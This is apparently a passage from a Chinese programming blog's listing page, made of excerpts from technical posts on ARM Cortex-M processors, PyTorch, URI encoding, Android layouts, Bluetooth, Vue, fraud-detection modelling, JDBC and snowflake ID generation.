今天， ARM Cortex-M 处理器家族有8款处理器成员。除此之外，ARM的产品系列还有很多其他的处理器成员。对很多初学者，甚至某些芯片设计经验丰富但是不熟悉ARM系列处理器的设计者来说，也是很容易混淆这些产品的。不同的ARM 处理器有不同的指令集，系统功能和性能。本文会深入展现Cortex-M系列处理器之间的关键区别，以及它们和ARM其他系列处理器的不同。
1.1ARM处理器家族
多年来， ARM已经研发了相当多的不同的处理器产品。 如下图中（图1）: ARM 处理器产品分为经典ARM处理器系列和最新的Cortex处理器系列。并且根据应用范围的不同，ARM处理器可以分类成3个系列。
Application Processors（应用处理器）–面向移动计算，智能手机，服务器等市场的的高端处理器。这类处理器运行在很高的时钟频率（超过1GHz），支持像Linux，Android，MS Windows和移动操作系统等完整操作系统需要的内存管理单元（MMU）。 如果规划开发的产品需要运行上述其中的一个操作系统，你需要选择ARM 应用处理器.
Real-time Processors （实时处理器）–面向实时应用的高性能处理器系列，例如硬盘控制器，汽车传动系统和无线通讯的基带控制。多数实时处理器不支持MMU，不过通常具有MPU、Cache和其他针对工业应用设计的存储器功能。实时处理器运行在比较高的时钟频率（例如200MHz 到 &gt;1GHz ），响应延迟非常低。虽然实时处理器不能运行完整版本的Linux和Windows操作系统， 但是支持大量的实时操作系统（RTOS）。
Microcontroller Processors（微控制器处理器）–微控制器处理器通常设计成面积很小和能效比很高。通常这些处理器的流水线很短，最高时钟频率很低（虽然市场上有此类的处理器可以运行在200Mhz之上）。 并且，新的Cortex-M处理器家族设计的非常容易使用。因此，ARM 微控制器处理器在单片机和深度嵌入式系统市场非常成功和受欢迎。
表1总结了三个处理器系列的主要特征。
1.2Cortex-M 处理器家族
Cortex-M处理器家族更多的集中在低性能端，但是这些处理器相比于许多微控制器使用的传统处理器性能仍然很强大。例如，Cortex-M4和Cortex-M7处理器应用在许多高性能的微控制器产品中，最大的时钟频率可以达到400Mhz。
当然，性能不是选择处理器的唯一指标。在许多应用中，低功耗和成本是关键的选择指标。因此，Cortex-M处理器家族包含各种产品来满足不同的需求：
不同于老的经典ARM处理器（例如，ARM7TDMI, ARM9）， Cortex-M处理器有一个非常不同的架构。例如：
-仅支持ARM Thumb?指令，已扩展到同时支持16位和32位指令Thumb-2版本
-内置的嵌套向量中断控制负责中断处理，自动处理中断优先级，中断屏蔽，中断嵌套和系统异常处理。
-中断处理函数可以使用标准的C语言编程，嵌套中断处理机制避免了使用软件判断哪一个中断需要响应处理。同时，中断响应速度是确定性的，低延迟的
-向量表从跳转指令变为中断和系统异常处理函数的起始地址。
-寄存器组和某些编程模式也做了改变。
这些变化意味着许多为经典ARM处理器编写的汇编代码需要修改，老的项目需要修改和重新编译才能迁移到Cortex-M的产品上。软件移植具体的细节记录在ARM文档：
ARM Cortex-M3 Processor Software Development for ARM7TDMI Processor Programmers
http://www.arm.com/files/pdf/Cortex-M3_programming_for_ARM7_developers.pdf
1.3Cortex-M系列处理器的共同特性
Cortex-M0, M0+, M3, M4 and M7之间有很多的相似之处，例如：
-基本编程模型 (章节 3.1)
-嵌套向量中断控制器（NVIC）的中断响应管理
-架构设计的休眠模式：睡眠模式和深度睡眠模式 (章节 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/81e6104a2a1699cabd107b0c8374d8e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac1c42afb498da2b9be85c661bcd18df/" rel="bookmark">
			pytorch中model.eval的作用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pytorch中model.eval()的作用 问题描述： torch.onnx.export()导出onnx模型后，利用onnxruntime加载onnx模型后，其输出结果与原始.pth模型的输出结果之间存在很大的差距；通过拆分网络结构，定位到nn.BatchNorm2d()层导致；
Batch Normalization和Dropout Batch Normalization
其作用对网络中间的每层进行归一化处理，并且使用变换重构（Batch Normalization Transform）保证每层提取的特征分布不会被破坏。训练时是针对每个mini-batch的，但是测试是针对单张图片的，即不存在batch的概念。由于网络训练完成后参数是固定的，每个batch的均值和方差是不变的，因此直接结算所有batch的均值和方差。所有Batch Normalization的训练和测试时的操作不同。Dropout
其作用克服Overfitting，在每个训练批次中，通过忽略一半的特征检测器，可以明显的减少过拟合现象。 model.train()和model.eval() train()
启用 BatchNormalization 和 Dropouteval()
不启用 BatchNormalization 和 Dropout，保证BN和dropout不发生变化，pytorch框架会自动把BN和Dropout固定住，不会取平均，而是用训练好的值，不然的话，一旦test的batch_size过小，很容易就会被BN层影响结果。 问题解决办法 在利用原始.pth模型进行前向推理之前，一定要先进行model.eval()操作，不启用 BatchNormalization 和 Dropout。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd9b0a70510b96d3200431a6102d5096/" rel="bookmark">
			URI编码的两方法异同与场景
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		encodeURI 这里先单纯介绍该函数的语法规则，场景后续说。先说作为一个函数，它能做什么。
它是全局对象下的方法，在浏览器器客户端里就是window对象的方法。它的作用是，对字符串的每个字符进行UTF-8编码，使用一到四个转义序列来表示。参数为要编码的字符串，返回值为编码后的字符串结果。
window.encodeURI(str) 编码的规则是：
除以下字符外，其余字符都进行编码
;,/?:@&amp;=+$ （此为URL的特殊字符）# （数字标识）字母和数字-_.!~*'()（保留的字符） 编码实际上是将每个字符先进行UTF-8编码，用16进制表示码值，然后在前面追加%来表示。如
encodeURI('我') // 返回值为 // %E6%88%91 先将“我”进行UTF-8编码后由0xE6、0x88、0x91三个字节来表示，然后每个字节前面加%，就变成了%E6%88%91
有编码自然有解码，对应的解码方法是decodeURI
encodeURIComponent 这里先单纯介绍该函数的语法规则，场景后续说。先说作为一个函数，它能做什么。
它是全局对象下的方法，在浏览器器客户端里就是window对象的方法。它的作用是，对字符串的每个字符进行UTF-8编码，使用一到四个转义序列来表示。参数为要编码的字符串，返回值为编码后的字符串结果。
window.encodeURIComponent(str) 编码的规则是：
除以下字符外，其余字符都进行编码
字母和数字-_.!~*'()（保留的字符） 编码实际上是将每个字符先进行UTF-8编码，用16进制表示码值，然后在前面追加%来表示。如
encodeURI('我') // 返回值为 // %E6%88%91 先将“我”进行UTF-8编码后由0xE6、0x88、0x91三个字节来表示，然后每个字节前面加%，就变成了%E6%88%91
有编码自然有解码，对应的解码方法是decodeURIComponent
二者的异同 由上面两节内容就可以看到，他们很相似，都是对字符串进行编码，唯一的差别就是，他们的编码规则不一样，可以看出他们的能力范围不同
二者都对字母和数字以及-_.!~*'()不会进行编码但encodeURI还会对别的一些保留字符不会进行编码，即它所能编码的字符比encodeURIComponent要少。 用下面的实例一目了然：
var set1 = ";,/?:@&amp;=+$"; // url特殊字符 var set2 = "-_.!~*'()"; // 保留的一些字符 var set3 = "#"; // 数字标识 var set4 = "ABC abc 123"; // 字母和数字，这里还有空格字符 console.log(encodeURI(set1)); // ;,/?:@&amp;=+$ console.log(encodeURI(set2)); // -_.!~*'() console.log(encodeURI(set3)); // # console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cd9b0a70510b96d3200431a6102d5096/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/586b111fea3de4ba6cb9824173e8f15e/" rel="bookmark">
			【约束布局】ConstraintLayout 屏障 Barrier 约束 ( 简介 | 屏障适用场景 | 位置说明 | 相关属性 | 可视化操作 | 代码示例 | 总结 )
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 I . 屏障 Barrier 约束 简介II . 屏障线 Barrier 与 引导线 Guideline 对比III . 屏障 Barrier 适用场景IV . 屏障 Barrier 位置说明V . 屏障 Barrier 相关属性VI . 屏障 Barrier 可视化操作VII . 屏障 Barrier 代码示例VIII . 屏障 Barrier 总结 I . 屏障 Barrier 约束 简介 屏障 Barrier 简介 :
① 屏障 Barrier 概念 : 屏障 Barrier 中 , 包含了多个组件 , 基于这些组件在某个方向 ( 如 : 上,下,左,右 ) 上创建的一条虚拟的线 , 屏障线的位置是其指定方向的最外侧的位置 ; 如 3 3 3 个组件的右屏障位置是 , 最右侧组件的右边缘位置 ;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/586b111fea3de4ba6cb9824173e8f15e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5522afb297e42240c65778c499dc8918/" rel="bookmark">
			ubuntu使用手机的usb共享网络
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 sudo dhclient usb0 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07c932af91a2ae2f69afa433383ea27d/" rel="bookmark">
			Android蓝牙开发—经典蓝牙和BLE（低功耗）蓝牙的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近在做蓝牙开发，刚接触时傻傻的分不清经典蓝牙和低功耗蓝牙的区别，一直用开发低功耗蓝牙的方法去连接经典蓝牙设备，最后当然是一直连接不上了。在此记录下经典蓝牙和低功耗蓝牙的区别和联系。
Android中的蓝牙 说到Android中的蓝牙，大家听到的可能有蓝牙1.0、蓝牙2.0、蓝牙3.0、蓝牙4.0之类的以数字结尾的蓝牙版本号，而实际上，在最新的标准中，已经不再使用数字版本号作为蓝牙版本的区分了，取而代之的是经典蓝牙与低功耗蓝牙（BLE）这两种区别。
这里提到的低功耗蓝牙也会有很多人会误解为就是蓝牙4.0，但是完整的蓝牙4.0规范中实际上包括有经典蓝牙和低功耗蓝牙这两个部分，大家看看如下这张分类表就能够明白这其中的关系了。
如表中所述，现在的蓝牙实际上分为了三类：单模、双模和经典。那么，最官方的蓝牙版本称呼就是，单模蓝牙、双模蓝牙和经典蓝牙。
在这其中，最前沿的当属单模蓝牙了，也就是低功耗蓝牙。这个蓝牙标准和经典蓝牙区别极大，在最初甚至考虑过加入WIFI阵营，但是因为蓝牙阵营这边条件较为优厚（比如授权费用极低）才并入了蓝牙标准。
那么，低功耗蓝牙和经典蓝牙的区别究竟在哪里呢？
要是仅仅从两者的通信方式上来说，可以说除了名字叫蓝牙外，完全可以当做两个东西。不过，两者在总体上的流程却也是相似的，那就是：
发现设备-&gt;配对/绑定设备-&gt;建立连接-&gt;数据通信 经典蓝牙和低功耗蓝牙除了配对/绑定这个环节是一样的之外，其它三个环节都是不同的。
1. 发现设备
经典蓝牙：经典蓝牙设备发现其它经典蓝牙设备的方式是调用BluetoothAdapter的startDiscovery()方法。
api上说的比较模糊，大致是说只能够发现经典蓝牙设备。
然而实验发现 BluetoothAdapter.startDiscovery是可以同时发现经典蓝牙和ble的
低功耗蓝牙：低功耗蓝牙中则有一个主设备（Central）和从设备（Peripheral，也叫外围设备）的概念。主设备作为发现方，调用发现设备的方法，通过BluetoothAdapter的startLeScan()方法实现。从设备则作为被发现方，发出广播，以供发现。同样，这个startLeScan()方法也仅能够发现低功耗蓝牙从设备。
总结：BluetoothAdapter.startDiscovery在大多数手机上是可以同时发现经典蓝牙和Ble的，但是startDiscovery的回调无法返回Ble的广播，所以无法通过广播识别设备，且startDiscovery扫描Ble的效率比StartLeScan低很多。所以在实际应用中，还是StartDiscovery和StartLeScan分开扫，前者扫传统蓝牙，后者扫低功耗蓝牙。
注意：当两种蓝牙设备被某设备（包括当前的设备）配对/绑定后，可能不会再被扫描到。
2. 配对/绑定
有很多小伙伴都不太理解配对和绑定究竟有什么区别，或者它们根本就是同一个东西。好吧，严格说配对和绑定是有区别的，也就是不是指的同一件事情。但是这两者的区别比较模糊，也不好解释。目前JACK的机器人的理解是，配对是建立两者的对应关系，而绑定则把这层关系保存固定下来并进行了强化，暂时这么理解着吧。
不管是经典蓝牙还是低功耗蓝牙，绑定方法都是通用的，可以调用相同的绑定方法。
3. 建立连接
在建立连接的方式上，两者就千差万别了。
——蓝牙小知识——
在蓝牙设备中，存在着物理地址，我们也叫作蓝牙的MAC地址，这个地址是唯一的，就像咱们网络上的IP地址。同时还存在着一个叫做UUID的东西，可以把它理解为是IP地址中的端口号。正如知道了IP地址和端口号，就知道了怎么链接到目标网络服务器位置，知道了蓝牙设备的MAC地址和UUID也就能够确定到具体是哪一台蓝牙设备了，这两者合起来就是蓝牙的唯一身份标识。
经典蓝牙：经典蓝牙建立连接的方式实际上就是Socket的连接的建立。只不过这里不是直接用Socket，而是BluetoothSocket。获取BluetoothSocket的方式也很简单，利用搜索找到的BluetoothDevice，调用其方法createRfcommSocketToServiceRecord(UUID)。最后，使用获取到的BluetoothDevice调用其方法connect()就建立了经典蓝牙设备之间的连接通道。
低功耗蓝牙：低功耗蓝牙则用了一种看起来比较怪异的方式建立连接。
——关于BLE的一些基本概念——
Generic Attribute Profile (GATT)
通过BLE连接，读写属性类小数据的Profile通用规范。现在所有的BLE应用Profile都是基于GATT的。
Attribute Protocol (ATT)
GATT是基于ATT Protocol的。ATT针对BLE设备做了专门的优化，具体就是在传输过程中使用尽量少的数据。每个属性都有一个唯一的UUID，属性将以characteristics and services的形式传输。
Characteristic
Characteristic可以理解为一个数据类型，它包括一个value和0至多个对次value的描述（Descriptor）。
Descriptor
对Characteristic的描述，例如范围、计量单位等。
Service
Characteristic的集合。例如一个service叫做“Heart Rate Monitor”，它可能包含多个Characteristics，其中可能包含一个叫做“heart rate measurement”的Characteristic。
这里举个例子，例如现在需要使用一个智能手机作为主设备去连接一个作为从设备的智能手环，那么，此时这个作为主设备的智能手机连接过程中实际是一个客户端（Client），而作为从设备的智能手环在此过程中则是服务端（Server）。这里的主设备和从设备，客户端和服务端一定要区分清楚。
想要和一台BLE从设备建立连接，一般是某个智能设备，例如智能手环、智能灯泡之类的。如果使用智能手机作为测试平台，其硬件条件是，蓝牙得至少是低功耗蓝牙版本，然后安卓系统的话，至少得是Android 4.3以上系统才行，因为Google在Android 4.3以上才做了BLE主设备的支持，如果想将智能手机作为BLE从设备，则必须在Android 5.0以上才行。
具体建立GATT连接的顺序则是，首先通过BluetoothAdapter的getRemoteDevice(address)方法获取大相应BLE从设备的BluetoothDevice，其中的address为目标蓝牙设备MAC地址。然后通过此BluetoothDevice的connectGatt(this, false, mGattCallback)方法获取设备连接。
此时的连接，只能够进行监听，也就是获取到当前BLE从设备广播出来的数据。
4. 数据通信
经典蓝牙：当建立连接后，就可以直接使用BluetoothSocket的getOutputStream()方法获取输出流写入需要发送的数据。读取发送回来的数据，则是调用BluetoothSocket的getInputStream()方法获取输入流读取。这点和Java中的Socket通信几乎是一模一样。
低功耗蓝牙：想要实现主设备对从设备的数据发送，则需要直接读取获取到的从设备的Characteristic，而Characteristic又是Service下面的一层，所以操作顺序是：
（1）通过BLE从设备相应的Service_UUID获取对应的BluetoothGattService，获取方法是：使用BluetoothDevice的connectGatt(this, false, mGattCallback)方法返回的BluetoothGatt对象，调用BluetoothGatt的方法getService(Service_UUID)获取相应的BluetoothGattService；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/07c932af91a2ae2f69afa433383ea27d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c5d5877989f9371735b246c9b20bddd1/" rel="bookmark">
			计算机原理之反馈与触发器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、蜂鸣器的原理 a、蜂鸣器的第一种方法
蜂鸣器的电路原理图如上所示，当开关闭合后，电路就连通了，连通的电路使得电磁铁把金属片拉了下来，当金属片的位置变化时，电路不再连通，电磁铁不再具有磁性，金属片又弹回原位。如此一来，电路又一次连通了。从整个过程来看，开关 一旦闭合，金属片就会上下跳动，电路也会随之连通或断开，声音就会随之发出。如果金属片发出一种刺耳的声音，那么这套系统就成为了一个蜂鸣器。
b、蜂鸣器的第二种方法
同理，电路中的开关一旦闭合，电路就会在连通和断开这两种状态之间反复替换
2、振荡器 1、振荡电路的输出图例：
2、
3、反馈 1、示例电路图如下：
首先说明下或非门的输入输出图：
反馈的电路图如下所示：
2、分析电路：
当闭合上面的那个开关的时候，分析左边的或非门，一个输入端为1，另一个输入端为0，则左边的或非门的输出端应该是为0，而右边的或非门的一个输入端是0，另一个输入端是0，那么右边的或非门的输出就应该是1。所以这个时候灯泡就亮了。
如果此时将上边的开关断开，那么左边的或非门输出的结果应该为（1+0）0，而右边的或非门输出的结果为（0+0）1，故此时灯泡应该也还是会亮。嗯。逻辑上似乎没有问题，但是这个很奇怪呀，都没有电能来源了呀？难道是做了电能的存储？什么时候做的存储？
电路的奇怪之处：同样是在两个开关都断开的状态下，灯泡有时亮着，有时不亮。当两个开关都断开时，电路有两个文档态，这类电路统称为触发器。
4、触发器的作用 触发器能记住某些东西？那岂不是可以用来做存储器了？
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc71c80bbe2aae6030840c1a7e89b361/" rel="bookmark">
			小项目中怎么防止Vue的闪现画面
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一句话总结 HTML: 元素加上v-cloak
CSS: [v-cloak]{display: none}
过程 页面刚加载的时候胡子语法会显示出来。
v-cloak是VueJS小型项目中提升用户体验简单且重要的方法。
用法 HTML中在你需要组织闪现的标签上加上v-cloak
&lt;div id="app"&gt; &lt;nav&gt;blabla&lt;/nav&gt; &lt;main v-cloak&gt;{{text}}&lt;/main&gt; &lt;/div&gt; CSS中给v-cloak设定样式，这个样式是只有【在vue实例编译结束前】应用的样式。
[v-cloak]{ display: none; } 原理 我没读完源码，但是v-cloak的原理我大概理解一点：
首先是CSS选择器，用[target]选择的是“带有 target 属性所有元素。”。可以点这里复习选择器。
那么[v-cloak]选择出来的就是所有带有v-cloak属性的元素了。
实例初始化完成之后，VueJS中会把Vue中特有的attribute去掉。在实例初始化完成之前，上面写的main的HTML代码实际是这样的：
&lt;main id="main" class="row" v-cloak=""&gt; 然后加上CSS，就把所有带有v-cloak的元素都display: block了。
其实不止是v-cloak，你可以用v-if来试试，CSS里使用[v-if]{display:none}，效果看起来是一样的。和v-cloak一样，v-if也是在实例编译完之后去掉。
源码 然后我刚才去读了一下源码，大概是这一段，感兴趣的大佬可以去搜搜读读理解理解。
if (isRealElement) { // mounting to a real element // check if this is server-rendered content and if we can perform // a successful hydration. if (oldVnode.nodeType === 1 &amp;&amp; oldVnode.hasAttribute(SSR_ATTR)) { oldVnode.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fc71c80bbe2aae6030840c1a7e89b361/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/80685695a441a9db1964528d21295ce2/" rel="bookmark">
			机器学习项目实战——信用卡反欺诈预测模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目背景 该项目所使用的数据集包含持卡人在两天内使用信用卡的交易情况，共有284807笔交易，其中有492笔交易为盗刷。数据集中的数据是经过了PCA降维，并且出于保密原因，这些特征都进行了脱敏处理，数据以秒为单位记录。通过对这些数据的分析，建模，可以对信用卡盗刷情况进行预测。有利于银行对存在风险的交易采取措施，减小银行和持卡人的损失。并设置合理的阈值，使得银行在减小盗刷损失的前提下，更好的提升使用信用卡的体验。
数据总览 从数据来看，类别分为：1（存在盗刷），0（正常交易），这是一个二分类问题。此外正负样本极度不平衡，可采用过采样的方式使样本类别平衡。特征V1至V28是经过PCA处理，而特征Time和Amount的数据规格与其他特征存在量纲上的区别，需要对这些特征进行处理，使这些特征的量纲相同。我们选取70%的数据进行训练，30%的数据进行预测和评估。
模型选择和评估 这是一个二分类监督学习场景，我们选择逻辑回归（Logistic Regression）算法。在模型评估方面。我们使用ROC曲线下的面积AUC。
读取数据 import pandas as pd data=pd.read_csv('creditcard.csv') y=data['Class'] 执行结果
RangeIndex: 284807 entries, 0 to 284806 Data columns (total 31 columns): Time 284807 non-null float64 V1 284807 non-null float64 V2 284807 non-null float64 V3 284807 non-null float64 V4 284807 non-null float64 V5 284807 non-null float64 V6 284807 non-null float64 V7 284807 non-null float64 V8 284807 non-null float64 V9 284807 non-null float64 V10 284807 non-null float64 V11 284807 non-null float64 V12 284807 non-null float64 V13 284807 non-null float64 V14 284807 non-null float64 V15 284807 non-null float64 V16 284807 non-null float64 V17 284807 non-null float64 V18 284807 non-null float64 V19 284807 non-null float64 V20 284807 non-null float64 V21 284807 non-null float64 V22 284807 non-null float64 V23 284807 non-null float64 V24 284807 non-null float64 V25 284807 non-null float64 V26 284807 non-null float64 V27 284807 non-null float64 V28 284807 non-null float64 Amount 284807 non-null float64 Class 284807 non-null int64 dtypes: float64(30), int64(1) memory usage: 67.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/80685695a441a9db1964528d21295ce2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c9e475fe4fd14aeb2e160945f441c5f/" rel="bookmark">
			【约束布局】ConstraintLayout 引导线 Guideline 约束 ( 简介 | 可视化操作 | 属性 | 水平引导线 | 垂直引导线 | 开始结束尺寸 | 百分比位置 | 约束组件 )
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 I . Guideline 引导线 总结II . Guideline 引导线 简介III . Guideline 引导线 可视化操作IV . Guideline 引导线 属性V . Guideline 引导线 位置定义 方式切换VI . Guideline 引导线 约束 其它组件VII . Guideline 代码示例 I . Guideline 引导线 总结 1 . Guideline 引导线 属性 :
① 方向属性 : android:orientation=“horizontal” ; 取值 horizontal / vertical ;
② 开始尺寸定义 : app:layout_constraintGuide_begin=“22dp” ; 取值 dp 尺寸值 ; 距离 顶部 ( 水平 ) , 左侧 ( 垂直 ) 位置 ;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3c9e475fe4fd14aeb2e160945f441c5f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc8e01c74a9644632e9b4796e7341c2c/" rel="bookmark">
			java连接sqlserver，mssql，jdbc驱动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 首先添加maven依赖：
&lt;dependency&gt; &lt;groupId&gt;com.microsoft.sqlserver&lt;/groupId&gt; &lt;artifactId&gt;sqljdbc4&lt;/artifactId&gt; &lt;version&gt;4.0&lt;/version&gt; &lt;/dependency&gt; 示例代码：
import java.sql.Connection; import java.sql.DriverManager; import java.sql.ResultSet; import java.sql.Statement; public class SQLServerJDBCTest { public static void main(String[] args)throws Exception { Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver"); String url = "jdbc:sqlserver://数据库IP:端口号;database=数据库名称;"; String username = "用户名"; String password="密码"; Connection connection = DriverManager.getConnection(url,username,password); String sql = "select count(1) from ad.test "; Statement statement = connection.prepareStatement(sql); ResultSet rs = statement.executeQuery(sql); while(rs.next()){ int result = rs.getInt(1); System.out.println(result); } } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/389da2de655cc32d97c6993d76333e8d/" rel="bookmark">
			雪花算法以及具体实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、为何要用雪花算法
1、问题产生的背景
现如今越来越多的公司都在用分布式、微服务，那么对应的就会针对不同的服务进行数据库拆分，然后当数据量上来的时候也会进行分表，那么随之而来的就是分表以后id的问题。
例如之前单体项目中一个表中的数据主键id都是自增的，mysql是利用autoincrement来实现自增，而oracle是利用序列来实现的，但是当单表数据量上来以后就要进行水平分表，阿里java开发建议是单表大于500w的时候就要分表，但是具体还是得看业务，如果索引用的号的话，单表千万的数据也是可以的。水平分表就是将一张表的数据分成多张表，那么问题就来了如果还是按照以前的自增来做主键id，那么就会出现id重复，这个时候就得考虑用什么方案来解决分布式id的问题了。
2、解决方案
2.1、数据库表
可以在某个库中专门维护一张表，然后每次无论哪个表需要自增id的时候都去查这个表的记录，然后用for update锁表，然后取到的值加一，然后返回以后把再把值记录到表中，但是这个方法适合并发量比较小的项目，因此每次都得锁表。
2.2、redis
因为redis是单线程的，可以在redis中维护一个键值对，然后哪个表需要直接去redis中取值然后加一，但是这个跟上面一样由于单线程都是对高并发的支持不高，只适合并发量小的项目。
2.3、uuid
可以使用uuid作为不重复主键id，但是uuid有个问题就是其是无序的字符串，如果使用uuid当做主键，那么主键索引就会失效。
2.4、雪花算法
雪花算法是解决分布式id的一个高效的方案，大部分互联网公司都在使用雪花算法，当然还有公司自己实现其他的方案。
二、雪花算法
1、原理
雪花算法就是使用64位long类型的数据存储id，最高位一位存储0或者1,0代表整数，1代表负数，一般都是0，所以最高位不变，41位存储毫秒级时间戳，10位存储机器码（包括5位datacenterId和5位workerId），12存储序列号。这样最大2的10次方的机器，也就是1024台机器，最多每毫秒每台机器产生2的12次方也就是4096个id。（下面有代码实现）
但是一般我们没有那么多台机器，所以我们也可以使用53位来存储id。为什么要用53位？
因为我们几乎都是跟web页面打交道，就需要跟js打交道，js支持最大的整型范围为53位，超过这个范围就会丢失精度，53之内可以直接由js读取，超过53位就需要转换成字符串才能保证js处理正确。53存储的话，32位存储秒级时间戳，5位存储机器码，16位存储序列化，这样每台机器每秒可以生产65536个不重复的id。
2、缺点
由于雪花算法严重依赖时间，所以当发生服务器时钟回拨的问题是会导致可能产生重复的id。当然几乎没有公司会修改服务器时间，修改以后会导致各种问题，公司宁愿新加一台服务器也不愿意修改服务器时间，但是不排除特殊情况。
如何解决时钟回拨的问题？可以对序列化的初始值设置步长，每次触发时钟回拨事件，则其初始步长就加1w，可以在下面代码的第85行来实现，将sequence的初始值设置为10000。
三、代码实现
64位的代码实现：
package com.yl.common; /** * Twitter_Snowflake&lt;br&gt; * SnowFlake的结构如下(每部分用-分开):&lt;br&gt; * 0 - 0000000000 0000000000 0000000000 0000000000 0 - 00000 - 00000 - 000000000000 &lt;br&gt; * 1位标识，由于long基本类型在Java中是带符号的，最高位是符号位，正数是0，负数是1，所以id一般是正数，最高位是0&lt;br&gt; * 41位时间截(毫秒级)，注意，41位时间截不是存储当前时间的时间截，而是存储时间截的差值（当前时间截 - 开始时间截) * 得到的值），这里的的开始时间截，一般是我们的id生成器开始使用的时间，由我们程序来指定的（如下下面程序IdWorker类的startTime属性）。41位的时间截，可以使用69年，年T = (1L &lt;&lt; 41) / (1000L * 60 * 60 * 24 * 365) = 69&lt;br&gt; * 10位的数据机器位，可以部署在1024个节点，包括5位datacenterId和5位workerId&lt;br&gt; * 12位序列，毫秒内的计数，12位的计数顺序号支持每个节点每毫秒(同一机器，同一时间截)产生4096个ID序号&lt;br&gt; * 加起来刚好64位，为一个Long型。&lt;br&gt; * SnowFlake的优点是，整体上按照时间自增排序，并且整个分布式系统内不会产生ID碰撞(由数据中心ID和机器ID作区分)，并且效率较高，经测试，SnowFlake每秒能够产生26万ID左右。 */ public class SnowflakeIdWorker { // ==============================Fields=========================================== /** 开始时间截 (2020-01-01) */ private final long twepoch = 1577808000000L; /** 机器id所占的位数 */ private final long workerIdBits = 5L; /** 数据标识id所占的位数 */ private final long datacenterIdBits = 5L; /** 支持的最大机器id，结果是31 (这个移位算法可以很快的计算出几位二进制数所能表示的最大十进制数) */ private final long maxWorkerId = -1L ^ (-1L &lt;&lt; workerIdBits); /** 支持的最大数据标识id，结果是31 */ private final long maxDatacenterId = -1L ^ (-1L &lt;&lt; datacenterIdBits); /** 序列在id中占的位数 */ private final long sequenceBits = 12L; /** 机器ID向左移12位 */ private final long workerIdShift = sequenceBits; /** 数据标识id向左移17位(12+5) */ private final long datacenterIdShift = sequenceBits + workerIdBits; /** 时间截向左移22位(5+5+12) */ private final long timestampLeftShift = sequenceBits + workerIdBits + datacenterIdBits; /** 生成序列的掩码，这里为4095 (0b111111111111=0xfff=4095) */ private final long sequenceMask = -1L ^ (-1L &lt;&lt; sequenceBits); /** 工作机器ID(0~31) */ private long workerId; /** 数据中心ID(0~31) */ private long datacenterId; /** 毫秒内序列(0~4095) */ private long sequence = 0L; /** 上次生成ID的时间截 */ private long lastTimestamp = -1L; //==============================Constructors===================================== /** * 构造函数 * @param workerId 工作ID (0~31) * @param datacenterId 数据中心ID (0~31) */ public SnowflakeIdWorker(long workerId, long datacenterId) { if (workerId &gt; maxWorkerId || workerId &lt; 0) { throw new IllegalArgumentException(String.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/389da2de655cc32d97c6993d76333e8d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2798c06caa2b4bc98d070b66b12816a8/" rel="bookmark">
			关于数据产品的数据设计思路
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据产品的设计思路，因数据产品移动端显示范围小，故所显示的数据需
1.统计数据，如按时间、部门、类别等维度进行合计等
2.分析结果数据，如完成百分比、增长率、同比率等
3.可下钻明细数据，如按季度合计，可以查看合计的月份数据，乃至日数据，直至下钻至最小级别数据
4.可切换维度，如原先按月统计的数据，可以切换至按客户维度分析
5.不滥用颜色及图表，颜色及图表搭配得当可提升数据表现力，以及视觉舒适性。
6.数据应当引发思考，可以从表象追查到具体原因，比如，某月数据偏低，进入查看，以地区维度划分，发现某地区同比极大偏低，进入查看，以客户维度划分，发现某高排名客户同比偏低，询问雇员原因，发现是该客户已经同其他品牌签订合约。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
